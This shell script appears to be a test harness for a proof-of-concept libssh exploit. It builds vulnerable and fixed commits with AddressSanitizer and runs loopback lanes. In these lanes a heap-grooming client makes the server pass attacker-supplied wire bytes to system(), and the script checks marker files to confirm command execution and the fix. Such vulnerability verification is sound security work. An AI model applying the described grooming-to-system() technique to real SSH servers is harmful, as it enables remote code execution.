#!/bin/sh
# W16 additive lane: the command string executed by real libc system() comes
# from the authenticated peer's wire bytes in the recycled channel itself, not
# from an app-owned static global. The ASan allocator places the recycled
# 128-byte channel at a deterministic address, so the client can point
# channel->session at the bytes it sent. Built against the same two pinned
# commits with no library source change; loopback only.
set -u
cd "$(dirname "$0")" || exit 1
HERE=$(pwd)

V=a540e27659b08828ef61f2910a790f7cf2af9f8d
F=7dfabb1fd213196c4912c314b418ff36c882ea54
VS=libssh-mirror-$V
FS=libssh-mirror-$F

provision() {
    sha=$1; dir=$2
    if [ ! -d "$dir" ]; then
        curl -fsSL --max-time 60 \
            "https://codeload.github.com/libssh/libssh-mirror/tar.gz/$sha" \
            -o "$dir.tar.gz" || return 1
        tar -xzf "$dir.tar.gz" || return 1
    fi
}

build_asan() {
    dir=$1; out=$2
    cmake -S "$dir" -B "$out" -G Ninja \
        -DCMAKE_BUILD_TYPE=Debug -DCMAKE_C_COMPILER=clang \
        -DWITH_SERVER=ON -DUNIT_TESTING=OFF -DBUILD_SHARED_LIBS=OFF \
        -DWITH_GSSAPI=OFF -DWITH_ZLIB=OFF >"$out.configure.log" 2>&1 &&
    ninja -C "$out" ssh >"$out.build.log" 2>&1
}

provision "$V" "$VS" && provision "$F" "$FS" || exit 1
for pair in "$VS build-asan vuln" "$FS build-fixed fixed"; do
    set -- $pair
    src=$1; b=$2; kind=$3
    build_asan "$src" "$b" || exit 1
    clang -std=gnu99 -O1 -g -fsanitize=address -fno-omit-frame-pointer \
        -DW14_REALSYSTEM -DW16_WIRECMD \
        -I"$b/src" -I"$src/src" -I"$src/include" -I"$b/include" -I"$b" \
        real_wire.c "$b/src/libssh.a" -lcrypto -lpthread -ldl \
        -o "real_wire-wc-$kind" || exit 1
done

if [ ! -f hostkey ]; then
    ssh-keygen -q -t ed25519 -N '' -f hostkey </dev/null >/dev/null 2>&1 || exit 1
fi

PASS=0; FAIL=0
run_lane() {
    n_name=$1; n_kind=$2; n_mode=$3
    mkdir -p "wc-run/$n_name"
    ln -sf "$HERE/hostkey" "wc-run/$n_name/hostkey"
    (cd "wc-run/$n_name" && \
        ASAN_OPTIONS=detect_leaks=0:quarantine_size_mb=0 timeout 25 \
        "$HERE/real_wire-wc-$n_kind" ./hostkey "$n_mode") \
        >"evidence-wc-$n_name.out" 2>&1
    echo "lane $n_name rc=$?"
}

marker_present() {
    [ -f "wc-run/$1/evidence-wire-wirecmd.marker" ] && echo yes || echo no
}

check_vuln() {
    c_out=evidence-wc-$1.out
    c_file=$(marker_present "$1")
    c_d2=$(grep -c 'SERVER data #2' "$c_out")
    c_arm=$(grep -c 'SERVER WIRECMD armed fn=' "$c_out")
    c_cl=$(grep -c 'CLIENT wirecmd fn=' "$c_out")
    c_tr=$(grep -c 'SERVER EXEC trampoline' "$c_out")
    c_ok=$(grep -c 'CLIENT rc=0 SERVER status=0x0' "$c_out")
    c_asan=$(grep -c 'ERROR: AddressSanitizer' "$c_out")
    if [ "$c_d2" = 1 ] && [ "$c_arm" = 1 ] && [ "$c_cl" = 1 ] &&
       [ "$c_tr" = 0 ] && [ "$c_ok" = 1 ] && [ "$c_file" = yes ] &&
       [ "$c_asan" = 0 ]; then
        PASS=$((PASS+1)); echo "PASS-$1 data2=$c_d2 armed=$c_arm client=$c_cl trampoline=$c_tr clean=$c_ok file=$c_file asan=$c_asan"
    else
        FAIL=$((FAIL+1)); echo "FAIL-$1 got[$c_d2 $c_arm $c_cl $c_tr $c_ok $c_file $c_asan]"
    fi
}

run_lane vuln-wirecmd vuln groom-wirecmd
check_vuln vuln-wirecmd
if [ "$(marker_present vuln-wirecmd)" = yes ]; then
    mv wc-run/vuln-wirecmd/evidence-wire-wirecmd.marker \
       evidence-wc-sideeffect.kept
fi

run_lane fixed-wirecmd fixed groom-wirecmd
f_out=evidence-wc-fixed-wirecmd.out
f_file=$(marker_present fixed-wirecmd)
f_d2=$(grep -c 'SERVER data #2' "$f_out")
f_arm=$(grep -c 'SERVER WIRECMD armed' "$f_out")
if [ "$f_d2" = 0 ] && [ "$f_arm" = 0 ] && [ "$f_file" = no ]; then
    PASS=$((PASS+1)); echo "PASS-fixed-wirecmd data2=0 armed=0 file=no"
else
    FAIL=$((FAIL+1)); echo "FAIL-fixed-wirecmd got[$f_d2 $f_arm $f_file]"
fi

run_lane vuln-wirecmd-bad vuln groom-wirecmd-bad
b_out=evidence-wc-vuln-wirecmd-bad.out
b_file=$(marker_present vuln-wirecmd-bad)
b_bad=$(grep -c 'CLIENT rc=0 SERVER status=0x' "$b_out")
b_ok=$(grep -c 'CLIENT rc=0 SERVER status=0x0' "$b_out")
b_cl=$(grep -c 'CLIENT wirecmd fn=0x4141414141414141' "$b_out")
b_done=$(grep -c 'SERVER done data_packets=2' "$b_out")
if [ "$b_bad" = 1 ] && [ "$b_ok" = 0 ] && [ "$b_cl" = 1 ] &&
   [ "$b_done" = 0 ] && [ "$b_file" = no ]; then
    PASS=$((PASS+1)); echo "PASS-vuln-wirecmd-bad client_armed=yes clean=no done=no file=no"
else
    FAIL=$((FAIL+1)); echo "FAIL-vuln-wirecmd-bad got[status=$b_bad clean=$b_ok cl=$b_cl done=$b_done file=$b_file]"
fi

for i in 1 2 3; do
    run_lane "vuln-repeat$i" vuln groom-wirecmd
    check_vuln "vuln-repeat$i"
    if [ "$(marker_present "vuln-repeat$i")" = yes ]; then
        mv "wc-run/vuln-repeat$i/evidence-wire-wirecmd.marker" \
           "evidence-wc-repeat$i.kept"
    fi
done

echo "wirecmd: $PASS PASS / $FAIL FAIL"
[ "$FAIL" -eq 0 ]
